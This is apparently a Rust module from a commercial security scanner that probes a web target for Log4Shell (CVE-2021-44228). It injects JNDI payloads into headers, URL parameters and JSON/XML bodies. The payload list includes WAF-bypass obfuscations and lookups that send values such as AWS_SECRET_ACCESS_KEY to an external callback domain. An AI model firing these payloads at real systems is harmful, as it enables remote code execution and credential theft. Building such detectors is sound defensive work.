// Copyright (c) 2025 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Bountyy Oy - Log4j/JNDI Injection Scanner
 * Detects Log4Shell (CVE-2021-44228) and related JNDI injection vulnerabilities
 *
 * Tests various injection points: Headers, parameters, body
 * Uses ${jndi:ldap://}, ${jndi:rmi://}, ${jndi:dns://} patterns
 *
 * @copyright 2025 Bountyy Oy
 * @license Proprietary
 */

use crate::http_client::HttpClient;
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use std::collections::HashMap;
use std::sync::Arc;
use tracing::{debug, info};

pub struct Log4jScanner {
    http_client: Arc<HttpClient>,
    callback_domain: String,
}

impl Log4jScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        // Generate unique callback identifier for detection
        let callback_id = generate_callback_id();
        Self {
            http_client,
            callback_domain: format!("{}.log4j.interact.sh", callback_id),
        }
    }

    pub async fn scan(
        &self,
        url: &str,
        _config: &ScanConfig,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        info!("Testing for Log4j/JNDI Injection (Log4Shell CVE-2021-44228)");

        // Test header injection points
        let (vulns, tests) = self.test_header_injection(url).await?;
        vulnerabilities.extend(vulns);
        tests_run += tests;

        // Test parameter injection
        let (vulns, tests) = self.test_parameter_injection(url).await?;
        vulnerabilities.extend(vulns);
        tests_run += tests;

        // Test body injection
        let (vulns, tests) = self.test_body_injection(url).await?;
        vulnerabilities.extend(vulns);
        tests_run += tests;

        Ok((vulnerabilities, tests_run))
    }

    /// Get Log4j/JNDI payloads with various bypass techniques
    fn get_jndi_payloads(&self) -> Vec<String> {
        let callback = &self.callback_domain;
        vec![
            // Basic JNDI lookups
            format!("${{jndi:ldap://{}/a}}", callback),
            format!("${{jndi:rmi://{}/a}}", callback),
            format!("${{jndi:dns://{}}}", callback),
            format!("${{jndi:ldaps://{}/a}}", callback),
            // Nested/Obfuscated payloads (WAF bypass)
            format!("${{${{lower:j}}ndi:ldap://{}/a}}", callback),
            format!("${{${{upper:j}}ndi:ldap://{}/a}}", callback),
            format!("${{${{lower:jndi}}:ldap://{}/a}}", callback),
            format!("${{j${{::-n}}di:ldap://{}/a}}", callback),
            format!("${{jn${{::-d}}i:ldap://{}/a}}", callback),
            format!("${{jndi:${{lower:l}}dap://{}/a}}", callback),
            // Environment variable lookups (info disclosure)
            format!("${{jndi:ldap://{}/$${{env:USER}}}}", callback),
            format!("${{jndi:ldap://{}/$${{env:AWS_SECRET_ACCESS_KEY}}}}", callback),
            format!("${{jndi:ldap://{}/$${{sys:user.name}}}}", callback),
            format!("${{jndi:ldap://{}/$${{java:version}}}}", callback),
            // Double encoding
            format!("${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{}/a}}", callback),
            // Unicode bypass
            format!("${{jndi:ldap://{}/\u{0061}}}", callback),
            // Base64 wrapped (some parsers decode)
            "${jndi:ldap://{{BASE64_CALLBACK}}/a}".to_string(),
        ]
    }

    /// Test injection via HTTP headers (most common vector)
    async fn test_header_injection(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let payloads = self.get_jndi_payloads();
        let tests_run = payloads.len() * 10; // Multiple headers per payload

        // Headers commonly vulnerable to Log4j
        let vulnerable_headers = vec![
            "User-Agent",
            "X-Api-Version",
            "X-Forwarded-For",
            "X-Request-Id",
            "X-Correlation-Id",
            "Authorization",
            "Referer",
            "Accept-Language",
            "X-Custom-Header",
            "Cookie",
        ];

        for payload in &payloads {
            for header_name in &vulnerable_headers {
                let mut headers = HashMap::new();
                headers.insert(header_name.to_string(), payload.clone());

                match self.http_client.get_with_headers(url, headers).await {
                    Ok(response) => {
                        // Check for indicators of Log4j processing
                        if self.detect_log4j_indicators(&response.body, &response.headers) {
                            info!("Potential Log4j vulnerability via {} header", header_name);
                            vulnerabilities.push(self.create_vulnerability(
                                url,
                                payload,
                                &format!("Header injection: {}", header_name),
                            ));
                            // Don't break - test all headers for comprehensive detection
                        }
                    }
                    Err(e) => debug!("Request failed: {}", e),
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test injection via URL parameters
    async fn test_parameter_injection(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let payloads = self.get_jndi_payloads();
        let tests_run = payloads.len() * 5;

        let test_params = vec!["search", "q", "query", "id", "name"];

        for payload in &payloads {
            for param in &test_params {
                let test_url = if url.contains('?') {
                    format!("{}&{}={}", url, param, urlencoding::encode(payload))
                } else {
                    format!("{}?{}={}", url, param, urlencoding::encode(payload))
                };

                match self.http_client.get(&test_url).await {
                    Ok(response) => {
                        if self.detect_log4j_indicators(&response.body, &response.headers) {
                            info!("Potential Log4j vulnerability via parameter: {}", param);
                            vulnerabilities.push(self.create_vulnerability(
                                url,
                                payload,
                                &format!("Parameter injection: {}", param),
                            ));
                        }
                    }
                    Err(e) => debug!("Request failed: {}", e),
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test injection via request body (JSON, XML)
    async fn test_body_injection(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let payloads = self.get_jndi_payloads();
        let tests_run = payloads.len() * 2;

        for payload in &payloads {
            // JSON body
            let json_body = format!(r#"{{"username":"{}","password":"test"}}"#, payload);
            
            match self.http_client.post(url, json_body).await {
                Ok(response) => {
                    if self.detect_log4j_indicators(&response.body, &response.headers) {
                        info!("Potential Log4j vulnerability via JSON body");
                        vulnerabilities.push(self.create_vulnerability(
                            url,
                            payload,
                            "JSON body injection",
                        ));
                    }
                }
                Err(e) => debug!("POST request failed: {}", e),
            }

            // XML body (Log4j also processes XML)
            let xml_body = format!(r#"<?xml version="1.0"?><root><data>{}</data></root>"#, payload);
            
            match self.http_client.post(url, xml_body).await {
                Ok(response) => {
                    if self.detect_log4j_indicators(&response.body, &response.headers) {
                        info!("Potential Log4j vulnerability via XML body");
                        vulnerabilities.push(self.create_vulnerability(
                            url,
                            payload,
                            "XML body injection",
                        ));
                    }
                }
                Err(e) => debug!("POST request failed: {}", e),
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Detect indicators that Log4j processed our payload
    fn detect_log4j_indicators(&self, body: &str, headers: &HashMap<String, String>) -> bool {
        let body_lower = body.to_lowercase();

        // Error messages indicating JNDI lookup was attempted
        let error_indicators = [
            "jndi",
            "lookup",
            "javax.naming",
            "com.sun.jndi",
            "ldap://",
            "rmi://",
            "reference class",
            "naming exception",
            "connection refused",
            "connect timed out",
            "log4j",
            "logging error",
        ];

        for indicator in &error_indicators {
            if body_lower.contains(indicator) {
                return true;
            }
        }

        // Check for timing-based detection (DNS callback delay)
        // This would require callback server integration for full detection

        // Check response headers for Java/Log4j indicators
        for (name, value) in headers {
            let val_lower = value.to_lowercase();
            if val_lower.contains("jndi") || val_lower.contains("log4j") {
                return true;
            }
        }

        false
    }

    fn create_vulnerability(&self, url: &str, payload: &str, technique: &str) -> Vulnerability {
        Vulnerability {
            id: format!("log4j_{}", uuid()),
            vuln_type: "Log4j JNDI Injection (Log4Shell)".to_string(),
            severity: Severity::Critical,
            confidence: Confidence::Medium, // High confidence requires callback confirmation
            category: "Remote Code Execution".to_string(),
            url: url.to_string(),
            parameter: None,
            payload: payload.to_string(),
            description: format!(
                "Potential Log4Shell (CVE-2021-44228) vulnerability detected via {}. \
                The application may be processing JNDI lookups from untrusted input, \
                allowing remote code execution.",
                technique
            ),
            evidence: Some(format!("Payload: {} | Technique: {}", payload, technique)),
            cwe: "CWE-917".to_string(),
            cvss: 10.0,
            verified: false, // Requires callback for full verification
            false_positive: false,
            remediation: "1. Upgrade Log4j to 2.17.1+ (Java 8) or 2.12.4+ (Java 7)\n\
                         2. Set log4j2.formatMsgNoLookups=true\n\
                         3. Remove JndiLookup class from classpath\n\
                         4. Use WAF rules to block JNDI patterns\n\
                         5. Monitor outbound connections for LDAP/RMI traffic".to_string(),
            discovered_at: chrono::Utc::now().to_rfc3339(),
        }
    }
}

fn generate_callback_id() -> String {
    use rand::Rng;
    let mut rng = rand::rng();
    format!("{:08x}", rng.random::<u32>())
}

fn uuid() -> String {
    use rand::Rng;
    let mut rng = rand::rng();
    format!("{:08x}{:04x}", rng.random::<u32>(), rng.random::<u16>())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_payload_generation() {
        let http_client = Arc::new(HttpClient::new(30, 3).unwrap());
        let scanner = Log4jScanner::new(http_client);
        let payloads = scanner.get_jndi_payloads();
        
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.contains("jndi:ldap")));
        assert!(payloads.iter().any(|p| p.contains("jndi:rmi")));
    }

    #[test]
    fn test_indicator_detection() {
        let http_client = Arc::new(HttpClient::new(30, 3).unwrap());
        let scanner = Log4jScanner::new(http_client);
        
        assert!(scanner.detect_log4j_indicators(
            "Error: javax.naming.NamingException",
            &HashMap::new()
        ));
        
        assert!(!scanner.detect_log4j_indicators(
            "Normal response without indicators",
            &HashMap::new()
        ));
    }
}
